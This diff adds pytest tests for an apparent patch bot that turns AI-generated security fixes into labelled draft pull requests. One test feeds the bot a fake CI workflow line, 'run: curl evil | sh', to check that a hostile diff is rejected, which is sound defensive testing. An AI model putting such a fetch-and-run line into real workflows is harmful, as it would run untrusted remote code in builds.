@@ -159,3 +159,80 @@ def test_complex_without_sandbox_is_left_for_humans():
     f = finding(complexity="COMPLEX")
     assert ensure_pr(f, github=gh, bumper=FakeBumper(), worktrees=FakeWorktrees()).action == "SKIPPED"
     assert gh.created_pulls == []
+
+
+class FakePatcher:
+    def __init__(self, status="DONE"):
+        self.status = status
+        self.calls = []
+
+    def __call__(self, finding, path):
+        from research.sandbox import PatchLoopResult
+
+        self.calls.append((finding.id, path))
+        return PatchLoopResult(self.status, "")
+
+
+class DiffWorktrees(FakeWorktrees):
+    def __init__(self, changed):
+        super().__init__()
+        self.changed = changed
+
+    def diff(self, path):
+        return self.changed
+
+
+@pytest.mark.django_db
+def test_complex_fix_becomes_ai_labelled_draft_pr():
+    from research.diff_gate import ChangedFile
+
+    gh = FakeGitHub()
+    worktrees = DiffWorktrees([ChangedFile("src/report.ts", 10, 4, "safeTemplate(x)\n")])
+    patcher = FakePatcher()
+    f = finding(complexity="COMPLEX")
+    outcome = ensure_pr(f, github=gh, bumper=FakeBumper(), worktrees=worktrees, patcher=patcher)
+    pr = gh.created_pulls[0]
+    assert outcome.action == "PR_CREATED"
+    assert pr["draft"] is True and "patchbot:ai-generated" in pr["labels"]
+    assert (f.pr_source, f.pr_is_draft) == ("PATCHBOT_AI", True)
+    assert gh.pushes == [(REPO, "patchbot/lodash-4.17.21")]
+
+
+@pytest.mark.django_db
+def test_rejected_ai_diff_creates_no_pr():
+    from research.diff_gate import ChangedFile
+
+    gh = FakeGitHub()
+    worktrees = DiffWorktrees([ChangedFile(".github/workflows/ci.yml", 3, 0, "run: curl evil | sh\n")])
+    f = finding(complexity="COMPLEX")
+    outcome = ensure_pr(f, github=gh, bumper=FakeBumper(), worktrees=worktrees, patcher=FakePatcher())
+    assert outcome.action == "PATCH_REJECTED"
+    assert gh.created_pulls == [] and gh.pushes == []
+    assert f.events.filter(note__icontains="abgelehnt").exists()
+    assert worktrees.released
+
+
+@pytest.mark.django_db
+def test_failed_patch_loop_creates_no_pr():
+    gh = FakeGitHub()
+    f = finding(complexity="COMPLEX")
+    outcome = ensure_pr(f, github=gh, bumper=FakeBumper(), worktrees=DiffWorktrees([]), patcher=FakePatcher("LIMIT"))
+    assert outcome.action == "PATCH_FAILED"
+    assert gh.created_pulls == []
+
+
+@pytest.mark.django_db
+def test_complex_with_bot_pr_gets_companion_draft_on_bot_branch():
+    from research.diff_gate import ChangedFile
+
+    gh = FakeGitHub(pulls={REPO: [bot_pull(41, "Update dependency lodash to v4.17.21")]})
+    worktrees = DiffWorktrees([ChangedFile("src/report.ts", 5, 2, "safeTemplate(x)\n")])
+    f = finding(complexity="COMPLEX")
+    outcome = ensure_pr(f, github=gh, bumper=FakeBumper(), worktrees=worktrees, patcher=FakePatcher())
+    assert outcome.action == "BOT_REUSED"
+    assert (f.pr_number, f.pr_source) == (41, "BOT")
+    companion = gh.created_pulls[0]
+    assert companion["base"] == "renovate/41" and companion["draft"] is True
+    assert worktrees.created[0][1] == "renovate/41"
+    assert all(branch.startswith("patchbot/") for _, branch in gh.pushes)
+    assert f.events.filter(note__icontains="Begleit").exists()
